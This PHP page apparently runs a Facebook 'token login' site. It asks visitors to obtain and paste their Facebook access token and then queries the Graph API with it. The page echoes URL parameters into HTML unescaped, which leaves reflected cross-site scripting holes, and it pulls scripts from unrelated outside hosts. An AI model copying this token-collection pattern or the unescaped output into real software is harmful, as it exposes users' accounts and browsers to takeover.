<?php
include 'head.php';


if(isset($_GET['i'])){
echo '
<div class="acr apl">' . $_GET['i'] . '</div>';
}
if($act=='reset') { session_destroy(); }
if(isset($_SESSION['id'])) {
print'
<div class="phdr" style="padding-bottom:2px;">
<table>
<tr>
<td class="menu" valign="top">
<a  href="http://facebook.com/'.$_SESSION['id'].'">
<img src="https://graph.facebook.com/'.$_SESSION['id'].'/picture" alt="User"/>
</a></td><td class="menu" valign="top">
<span class="mfsl fcb">
'.$_SESSION['name'].'
<br/>

<img src="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yr/r/kkE5oR4elmj.png" width="12" height="14" class="img" />
</span> <span class="fcg"> Click <a class="sec" href="http://facebook.com/sharer.php?u=https://youtube.com/AbdulsTeachCorner/">Here</a> To Share.</span></td></tr></table>
</td>
</tr>
</table>
<iframe class="img r" src="https://www.facebook.com/plugins/subscribe.php?href=https://www.facebook.com/mr.genious2&layout=button_count&show_faces=true"></iframe>
</div>

';
include 'menu.php';
}else{
form();
}



function form(){
$js = '<script type="text/javascript" src="judul.js"></script>';
print '<div class="phpcode">
<div class="phpcode">
<span class="sec" >
<center><b>'.$js.'</b></center></span>
</div>
</div></center></div><div class="top"><a href="/"> Home</a> | <a href="https://facebook.com/mr.genious2">Admin</a> | <a href="http://abdulstechcorner.blogspot.com">Blog</a></div>
<div class="br"><div class="title">Welcome</div><div class="news"><img src="http://mackie.wapsite.me/images/Calendar_1.png"> <script src="http://seveen.xtgem.com/master/js/waktu/date4.js"></script><br>
<img src="http://seveen.xtgem.com/master/icon/menu/32.png"/> <script language="JavaScript" src="http://chef.sextgem.com/javascript/sapa/sapa3.js"></script></div>
<form action="login.php" method="post">
<div class="header">
<div class="br"><div class="title">Get Access Token</a></div><div class="menu"><span style="color: red;">&raquo;</span><a href="http://toknx.ga" target="_blank"> Click Here [<font color="red">To Get Token</font>]</a></div>
<div class="br"><div class="title">Input Token Here</a></div><div class="menu"><span style="color: red;">&raquo;</span>
Paste Token In The Blank Box
<br /> 
<input class="input" name="access_token" value="'.$_GET[access_token].'" type="text" style="width:55%"/>

<td class="btnCell"><input
value="Login" type="submit" class="_56bs _5of- _56bu" data-sigil="composer-
submit"/><br/>
</div>
</div>
</div>
</center>
</div>
</form>
</div>
</div></div>
<div class="br"><div class="title">Partner Site</div>
<div class="menu"><span style="color: maroon;">&raquo;</span> <a href="https://facebook.com/mr.genious2" target="_blank"> Abdul Rehman(Admin)</a></div>
<div class="menu"><span style="color: maroon;">&raquo;</span> <a href="https://youtube.com/c/AbdulsTeachCorner" target="_blank">YouTube Channel</a></div><div class="menu"><span style="color: maroon;">&raquo;</span> <a href="http://abdulstechcorner.blogspot.com" target="_blank"> Blog(Download Scripts From Here)</a></div>

 
'; 

print '</div></div></div></div></div></div>
';
}
include 'footer.php';

function getData($dir,$params=null){
    $param = array(
    'access_token' => getToken(),
    );
   if($params){ $arrayParams=array_merge($params,$param); }else{ $arrayParams =$param; }
   $url = getUrl('graph',$dir,$arrayParams);
   $result = json_decode(auto($url),true);
   if($result[data]){
      return $result[data];
      }else{
      return $result;
   }
}
function getUrl($domain,$dir,$uri=null){
    if($uri){
         foreach($uri as $key =>$value){
             $parsing[] = $key . '=' . $value;
                }
             $parse = '?' . implode('&',$parsing);
                }
     return 'https://' . $domain . '.facebook.com/' . $dir . $parse;
       }

function getToken(){
        return $_SESSION['access_token'];
        }

function auto($url){
$curl = curl_init();
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_URL, $url);
$ch = curl_exec($curl);
curl_close($curl);
return $ch;
}
?>